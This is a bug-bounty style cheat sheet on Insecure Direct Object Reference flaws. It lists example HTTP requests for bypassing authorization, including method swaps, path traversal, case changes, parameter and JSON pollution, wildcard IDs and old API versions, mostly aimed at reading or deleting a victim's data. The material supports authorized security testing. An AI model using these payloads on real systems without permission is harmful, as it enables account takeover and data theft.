# Insecure Direct Object Reference (IDOR)

## Locations:

### 1: URL

### 2: JS Files

### 3: Content loaded via an AJAX request

#### Use parameter mining attack to uncover sensitive to IDOR parameters.

# IDs

### 1: Encoded (Base64)

### 2: Hashed (MD5)

### 3: Unpredictable (Create 2 accounts and swap ID numbers between them)


## IDOR

`Identify IDORS`
- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

## Steps

1. Create two accounts if possible or else enumerate users first.

2. Check if the endpoint is private or public and does it contains any kind of id param.

3. Try changing the param value to some other user and see if does anything to their account.

4. Done !!

## Examples:

#### 1) Image profile [ ] delete account [ ] information account [ ] VIEW & DELETE & Create api_key [ ] allows to read any comment [ ] change price [ ] change the coin from dollar to uaro [ ] Try to decode the ID, if the ID is encoded using md5,base64, etc

    GET /GetUser/dmljdGltQG1haWwuY29t

#### 2) Change HTTP method

    GET /users/delete/victim_id ->403
    POST /users/delete/victim_id ->200

#### 3) Try replacing parameter names

Instead of this:

    GET /api/albums?album_id=<album id>

Try This:

    GET /api/albums?account_id=<account id>

Tip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.

#### 4) Path Traversal

    POST /users/delete/victim_id ->403
    POST /users/delete/my_id/..victim_id ->200

#### 5) Change request content-type

    Content-Type: application/xml -> Content-Type: application/json

#### 6) Swap non-numeric with numeric ID

    GET /file?id=90djbkdbkdbd29dd
    GET /file?id=302

#### 7) Missing Function Level Access Control

    GET /admin/profile ->401
    GET /Admin/profile ->200
    GET /ADMIN/profile ->200
    GET /aDmin/profile ->200
    GET /adMin/profile ->200
    GET /admIn/profile ->200
    GET /admiN/profile ->200

#### 8) Send wildcard instead of an ID

    GET /api/users/user_id -> GET /api/users/*

#### 9) Never ignore encoded/hashed ID

For a hashed ID, create multiple accounts and understand the pattern application users to allot an ID

#### 10) Google Dorking/public form

Search all the endpoints having ID which the search engine may have already indexed

#### 11) Bruteforce Hidden HTTP parameters

Tools: arjun, paramminer

#### 12) Bypass object level authorization. Add parameter onto the endpoint if not present by default

    GET /api_v1/messages ->200
    GET /api_v1/messages?user_id=victim_uuid ->200

#### 13) HTTP Parameter Pollution gives multiple values for the same parameter

    GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
    GET /api_v1/messages?user_id=victim_id&user_id=attacker_id

#### 14) Change file type

    GET /user_data/2341 -> 401
    GET /user_data/2341.json -> 200
    GET /user_data/2341.xml -> 200
    GET /user_data/2341.config -> 200
    GET /user_data/2341.txt -> 200

#### 15) JSON parameter pollution

    {"userid":1234,"userid":2542}

#### 16) Wrap the ID with an array in the body

    {"userid":123} ->401
    {"userid":[123]} ->200

#### 17) Wrap the ID with a JSON object

    {"userid":123} ->401
    {"userid":{"userid":123}} ->200

#### 18) Test an outdated API version

    GET /v3/users_data/1234 ->401
    GET /v1/users_data/1234 ->200

#### 19) Find IDOR using GraphQL if the website uses GraphQL

    GET /graphql
    GET /graphql.php?query=
